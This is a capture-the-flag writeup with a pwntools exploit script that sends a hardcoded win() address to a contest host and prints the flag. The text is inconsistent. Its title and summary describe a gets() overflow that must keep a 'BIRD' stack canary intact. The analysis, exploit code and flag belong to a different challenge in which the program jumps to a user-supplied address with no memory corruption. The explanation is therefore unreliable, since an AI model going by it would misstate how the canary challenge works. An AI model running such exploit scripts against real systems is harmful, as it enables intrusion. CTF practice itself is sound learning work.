# Canary in the Bitcoin Mine - Writeup

---

## Challenge Description

![Alt text](img/1.png)

---

## Exploit Demo

This demo shows the exploitation flow:

![Alt text](gif/CanaryInTheBitcoinMine.gif)

---

## Challenge Summary

This challenge simulates a buffer overflow scenario protected by a stack canary. The program reads user input into a fixed-size buffer using the unsafe gets() function. The buffer is followed by a canary value (0x44524942, representing "BIRD"), and a boolean flag earnedFlag.

If the input overwrites the canary, the program detects the corruption and exits. To earn the flag, the attacker must carefully overflow the buffer without corrupting the canary, and set the earnedFlag variable to true. Once set, the hidden win() function is triggered to print the flag from flag.txt.

## Binary Information

```bash
$ file canary_in_the_bitcoin_mine
```

![Alt text](img/2.png)

```bash
$ pwn checksec canary_in_the_bitcoin_mine
```

![Alt text](img/3.png)

---

## Static Analysis (IDA Pro)

The main() function reads a user-supplied 64-bit memory address using scanf("%lx", &v4) and stores it in a function pointer. It then calls this pointer (v5()), effectively jumping to the user-provided address.
![Alt text](img/4.png)
Because PIE is disabled, all function addresses (including hidden ones) are fixed and visible. Using IDA Pro, we can locate the win() function easily in the .text segment. The function opens "flag.txt", reads its contents, and prints them character-by-character using putchar().
![Alt text](img/5.png)
There are no memory corruption vulnerabilitiesâ€”this is a direct ret2win-style challenge, where the only requirement is to supply the correct address of win() when prompted.

The presence of stack canaries and NX is irrelevant here, as no overflow occurs. The lack of PIE is what enables the exploit.

---

## Exploit Strategy

No complex exploit is needed. This is a classic ret2win challenge.

Since PIE is disabled, the address of the win() function is static and can be retrieved using tools like IDA Pro, Ghidra, or nm. Once identified, the player simply inputs the address when prompted by the program.

The binary will then jump directly to that address and execute the win() function, which reads and prints the contents of flag.txt. No memory corruption, bruteforce, or bypass is required.

## Exploit Code

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template where_we_jmping --host kubenode.mctf.io --port 30006
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'where_we_jmping')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'kubenode.mctf.io'
port = int(args.PORT or 30006)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# Stripped:   No

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

win_addr = b'0x4011a6'
io.recvuntil(b'Enter a memory address to jump to (as a hexadecimal, e.g., 0x401222): ')
io.sendline(win_addr)
for i in range(2) :
    io.recvline()
flag = io.recvline().strip()
log.success(f"FLAG : \033[1;33m{flag.decode()}\033[1;0m")

```

---

## Exploit Output

![Alt text](img/6.png)

---

## Vulnerability Summary

The program takes a user-supplied memory address and directly jumps to it. With PIE disabled, function addresses like win() are static and easy to find. This allows the user to redirect execution without any memory corruption, making it a simple ret2win vulnerability.

## Flag

```
MetaCTF{jmp1ng_t0_th3_g00d_l00t}
```
